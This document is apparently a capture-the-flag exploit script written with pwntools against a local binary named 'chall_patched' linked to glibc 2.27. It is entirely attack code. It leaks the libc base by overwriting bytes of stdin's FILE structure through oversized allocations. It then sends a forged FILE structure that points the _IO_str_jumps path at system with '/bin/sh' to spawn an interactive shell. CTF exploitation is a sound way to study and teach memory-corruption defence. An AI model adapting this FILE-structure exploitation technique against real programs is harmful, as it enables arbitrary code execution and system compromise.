from pwn import *

elf = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
p = process("./chall_patched", env={"LD_PRELOAD":"libc.so.6"})
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p, gdbscript='''
                        continue
                        ''')

def create(a_size, r_size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("alloc size: ", str(a_size))
    p.sendlineafter("read size: ", str(r_size))
    p.sendlineafter("data: ", data)
def create_after_overwrite(a_size, r_size, data):
    p.sendline("1")
    p.sendline(str(a_size))
    p.sendline(str(r_size))
    p.sendline(data)

def solve():
    # leak libc 
    create(0x200000, 0x5ed761, "A")     # overwrite lsb of _IO_write_base
    create_after_overwrite(0x200000, 0x5e6761 + 0x208010, "A")  # overwrite lsb of _IO_read_end
    io_stdin_prev_leak = libc.symbols["_IO_2_1_stdin_"]
    libc.address = u64(p.recvline()[8:14].ljust(8, b'\x00')) - 0x3ed8b0
    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    stdout       = libc.symbols["_IO_2_1_stdout_"]
    stdin        = libc.symbols["_IO_2_1_stdin_"]
    # wide_data    = libc.symbols["_IO_wide_data_1"]
    success("libc address: %s"%hex(libc.address))
    success("system add: %s"%hex(system))
    success("binsh add: %s"%hex(binsh))
    
    # get shell
    space = (0x200000 + 0x1000) * 3 - 0x10
    create_after_overwrite(0x200000, space + io_stdin_prev_leak + 0x38 + 1, 'A')    # overwrite lsb of ...
    
    payload = p64(0xfbad208b)
    payload += p64(libc.symbols['_IO_2_1_stdout_'] + 0xd8)
    payload += p64(libc.symbols['_IO_2_1_stdout_']) * 6
    payload += p64(libc.symbols['_IO_2_1_stdout_'] + 0x2000)
    payload += b'\0' * (8*7 + 4) # padding
    new_size = binsh
    payload += p64(0xfbad1800)
    payload += p64(0) # _IO_read_ptr
    payload += p64(0) # _IO_read_end
    payload += p64(0) # _IO_read_base
    payload += p64(0) # _IO_write_base
    payload += p64((new_size - 100) // 2) # _IO_write_ptr
    payload += p64(0) # _IO_write_end
    payload += p64(0) # _IO_buf_base
    payload += p64((new_size - 100) // 2) # _IO_buf_end
    payload += p64(0) * 4
    payload += p64(libc.symbols["_IO_2_1_stdin_"])
    payload += p64(1) + p64((1<<64) - 1)
    payload += p64(0) + p64(libc.address + 0x3ed8c0)
    payload += p64((1<<64) - 1) + p64(0)
    payload += p64(libc.address + 0x3eb8c0)
    payload += p64(0) * 6
    payload += p64(libc.address + 0x3e8360) # _IO_str_jumps
    payload += p64(system)
    payload += p64(libc.symbols["_IO_2_1_stdout_"])
    payload += p64(libc.symbols["_IO_2_1_stdin_"])
    p.sendlineafter("> ", payload)
    p.interactive()

if __name__ == "__main__":
    solve()